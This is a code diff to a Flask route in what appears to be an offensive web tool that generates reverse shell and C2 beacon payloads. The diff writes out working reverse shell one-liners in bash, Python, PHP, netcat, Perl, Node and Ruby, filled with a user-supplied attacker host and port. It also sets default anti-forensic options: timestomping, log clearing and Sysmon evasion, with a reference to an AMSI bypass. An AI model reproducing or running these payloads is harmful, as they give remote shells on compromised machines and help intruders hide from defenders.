@@ -279,28 +279,56 @@ def details(scan_id):
 
 @scans_bp.route("/payloads", methods=["GET", "POST"])
 def payloads_generator():
-    """Payload üretici"""
+    """Modern Payload üretici - Monolith Framework Integration"""
     if not session.get("logged_in"):
         return redirect("/login")
-
-    payloads_dict = {
-        "bash": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
-        "python": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' """,
-        "php": """php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' """,
-        "nc": "nc -e /bin/sh LHOST LPORT",
-        "perl": """perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """,
-        "node": """node -e 'require("child_process").exec("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")' """,
-        "ruby": """ruby -rsocket -e 'c=TCPSocket.new("LHOST",LPORT);while true;cmd=c.gets;system(cmd);c.puts `#{cmd}`;end' """,
-        "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);""",
-    }
 
     if request.method == "POST":
         lhost = request.form.get("lhost", "127.0.0.1")
         lport = request.form.get("lport", "4444")
         payload_type = request.form.get("payload_type", "bash")
-
-        payload = payloads_dict.get(payload_type, payloads_dict["bash"])
-        payload = payload.replace("LHOST", lhost).replace("LPORT", lport)
+        
+        # Modern payloads via PayloadGenerator
+        from cybermodules.payload_generator import PayloadGenerator
+        
+        # C2 URL - if using reverse shell, construct from LHOST/LPORT
+        if payload_type in ["python", "powershell", "bash"]:
+            # C2 beacon mode (preferred)
+            c2_url = f"http://{lhost}:{lport}/c2/beacon"
+        else:
+            # Legacy reverse shell mode
+            c2_url = f"http://{lhost}:{lport}/c2/beacon"
+        
+        generator = PayloadGenerator(c2_url)
+        
+        # Generate with full God Mode anti-forensics by default
+        options = {
+            'sleep': 30,
+            'jitter': 10,
+            'god_mode': {
+                'enabled': True,
+                'timestomp': True,
+                'clean_logs': True,
+                'sysmon_evade': True
+            }
+        }
+        
+        try:
+            payload = generator.generate(payload_type, options)
+        except Exception as e:
+            # Fallback to legacy reverse shells if needed
+            payloads_dict = {
+                "bash": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
+                "python": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' """,
+                "php": """php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' """,
+                "nc": "nc -e /bin/sh LHOST LPORT",
+                "perl": """perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """,
+                "node": """node -e 'require("child_process").exec("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")' """,
+                "ruby": """ruby -rsocket -e 'c=TCPSocket.new("LHOST",LPORT);while true;cmd=c.gets;system(cmd);c.puts `#{cmd}`;end' """,
+                "powershell": "# Fallback not available - use /c2/payloads/generate",
+            }
+            payload = payloads_dict.get(payload_type, payloads_dict["bash"])
+            payload = payload.replace("LHOST", lhost).replace("LPORT", lport)
 
         with db_conn() as conn:
             conn.execute(
@@ -310,13 +338,21 @@ def payloads_generator():
             conn.commit()
 
         payload_html = (
-            "<code style='background: #1a1a2e; padding: 10px; display: block; word-wrap: break-word; border-radius: 5px; color: #00ff88;'>"
+            "<code style='background: #1a1a2e; padding: 10px; display: block; word-wrap: break-word; border-radius: 5px; color: #00ff88; font-size: 11px; max-height: 400px; overflow-y: auto;'>"
             f"{payload}</code>"
         )
+        
+        # Return payload info
+        payload_info = {
+            'type': payload_type,
+            'size': len(payload),
+            'features': 'Elite Beacon with God Mode' if 'Invoke-AMSIBypass' in payload or 'auto_timestomp' in payload else 'Legacy Reverse Shell'
+        }
     else:
         payload_html = ""
+        payload_info = None
 
-    return render_template("payloads.html", payload_html=payload_html, payloads_dict=payloads_dict)
+    return render_template("payloads.html", payload_html=payload_html, payload_info=payload_info)
 
 
 @scans_bp.route("/autoexploit")
